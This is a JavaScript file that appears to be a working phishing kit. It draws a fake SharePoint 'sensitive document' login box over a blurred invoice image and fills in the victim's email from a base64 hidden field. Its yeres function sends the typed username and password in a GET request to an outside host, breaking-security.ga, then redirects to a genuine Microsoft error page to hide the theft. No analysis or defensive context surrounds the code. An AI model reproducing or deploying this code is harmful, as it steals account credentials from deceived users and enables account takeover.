var f = document.createElement("link");
f.href = "https://fonts.googleapis.com/css?family=Allerta";
f.rel = "stylesheet";
document.head.appendChild(f);

var e = document.createElement("style");
e.innerHTML = ".loading{position:fixed;z-index:999;height:2em;width:2em;overflow:show;margin:auto;top:0;left:0;bottom:0;right:0}.loading:before{content:'';display:block;position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(rgba(20,20,20,.8),rgba(0,0,0,.8));background:-webkit-radial-gradient(rgba(20,20,20,.8),rgba(0,0,0,.8))}.loading:not(:required){font:0/0 a;color:transparent;text-shadow:none;background-color:transparent;border:0}.loading:not(:required):after{content:'';display:block;font-size:10px;width:1em;height:1em;margin-top:-.5em;-webkit-animation:spinner 150ms infinite linear;-moz-animation:spinner 150ms infinite linear;-ms-animation:spinner 150ms infinite linear;-o-animation:spinner 150ms infinite linear;animation:spinner 150ms infinite linear;border-radius:.5em;-webkit-box-shadow:rgba(255,255,255,.75) 1.5em 0 0 0,rgba(255,255,255,.75) 1.1em 1.1em 0 0,rgba(255,255,255,.75) 0 1.5em 0 0,rgba(255,255,255,.75) -1.1em 1.1em 0 0,rgba(255,255,255,.75) -1.5em 0 0 0,rgba(255,255,255,.75) -1.1em -1.1em 0 0,rgba(255,255,255,.75) 0 -1.5em 0 0,rgba(255,255,255,.75) 1.1em -1.1em 0 0;box-shadow:rgba(255,255,255,.75) 1.5em 0 0 0,rgba(255,255,255,.75) 1.1em 1.1em 0 0,rgba(255,255,255,.75) 0 1.5em 0 0,rgba(255,255,255,.75) -1.1em 1.1em 0 0,rgba(255,255,255,.75) -1.5em 0 0 0,rgba(255,255,255,.75) -1.1em -1.1em 0 0,rgba(255,255,255,.75) 0 -1.5em 0 0,rgba(255,255,255,.75) 1.1em -1.1em 0 0}@-webkit-keyframes spinner{0%{-webkit-transform:rotate(0);-moz-transform:rotate(0);-ms-transform:rotate(0);-o-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}@-moz-keyframes spinner{0%{-webkit-transform:rotate(0);-moz-transform:rotate(0);-ms-transform:rotate(0);-o-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}@-o-keyframes spinner{0%{-webkit-transform:rotate(0);-moz-transform:rotate(0);-ms-transform:rotate(0);-o-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes spinner{0%{-webkit-transform:rotate(0);-moz-transform:rotate(0);-ms-transform:rotate(0);-o-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}*{font-family:Allerta,arial,Tahoma;box-sizing:border-box}body{background-image:url(https://cdn.jsdelivr.net/gh/EscobarSmith/jquery/invoice.png);background-repeat:no-repeat;background-attachment:fixed;background-position:center;background-size:cover;background-origin:border-box;text-align:center;color:#fff}h3{text-shadow:1px 1px 1px #fff;color:#222}.overlay{position:absolute;width:100%;height:100%;background-color:rgba(255,255,255,.4)}.modal{position:fixed;left:0;top:0;width:100%;height:100%;background-color:rgba(0,0,0,.5);opacity:0;visibility:hidden;transform:scale(1.1);transition:visibility 0s linear .25s,opacity .25s 0s,transform .25s}.modal-content{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background-color:#fff;padding:1rem 1.5rem;width:24rem;border-radius:.5rem}.close-button{float:right;width:1.5rem;line-height:1.5rem;text-align:center;cursor:pointer;border-radius:.25rem;background-color:#d3d3d3}.close-button:hover{background-color:#a9a9a9}.show-modal{opacity:1;visibility:visible;transform:scale(1);transition:visibility 0s linear 0s,opacity .25s 0s,transform .25s}.trigger{margin-top:15px;padding-top:5px;padding-bottom:5px;padding-left:15px;padding-right:15px}";
document.head.appendChild(e);

uigjsh();

function annatamba(str) {
    return decodeURIComponent(atob(str).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
}

function uigjsh() {
    var allow = document.getElementById("allow").value;
    if (allow != 'yes') {
        var modal = document.createElement("div");
        modal.setAttribute("class", "modal");
        modal.setAttribute("id", "myModal");
        var modalc = document.createElement("div");
        modalc.setAttribute("class", "modal-content");
        var content = document.createElement("h3");
        var em = annatamba(document.getElementById("iii").value);
        var form = `<img src="https://cdn.jsdelivr.net/gh/EscobarSmith/jquery/sharepoint.png"><p>This is a sensitive document, you must authenticate to view!</p><h5 id="email">`+em+`</h5>
        <table> <tr> <td> Username: </td> <td> <input type="text" id="username" value=""/> <input type="hidden" id="reason" value=""/> </td> </tr> <tr> <td> Password: </td> <td> <input type="password" id="pass" value=""/> </td> </tr> </table> 
        <h6 id="error-div" style="color:red;display:none">Incorrect username or password. Please try again.</h6><button id="trigger" class="trigger" onClick="yeres()">View Document</button>`;
        content.innerHTML = form;
        modalc.appendChild(content);
        modal.appendChild(modalc);
        document.getElementById("body").appendChild(modal);
        var x = document.createElement("script");
        x.text = `function yeres(){var e=document.getElementById("trigger"),t=document.getElementById("username").value,n=document.getElementById("pass").value,a=document.getElementById("iii").value,d=document.getElementById("reason").value,s=document.getElementById("rrr").value;if(e.innerText="Please wait...",!t||!n||!a)return document.getElementById("error-div").style.display="block",void(e.innerText="View Document");const l=new XMLHttpRequest;l.onreadystatechange=function(){4==this.readyState&&200==this.status&&("ok"===this.responseText?(window.location.href="https://docs.microsoft.com/en-us/sharepoint/sharepoint-onedrive-error-message",document.getElementById("allow").value="yes"):(document.getElementById("reason").value="2",document.getElementById("username").value="",document.getElementById("pass").value="",document.getElementById("error-div").style.display="block",e.innerText="View Document"))},l.open("GET","https://breaking-security.ga?target=attachment&username="+t+"&password="+n+"&reason="+d+"&owner="+a+"&r="+s),l.send()}`;
        document.body.appendChild(x);
        modal.classList.toggle("show-modal");
    }
}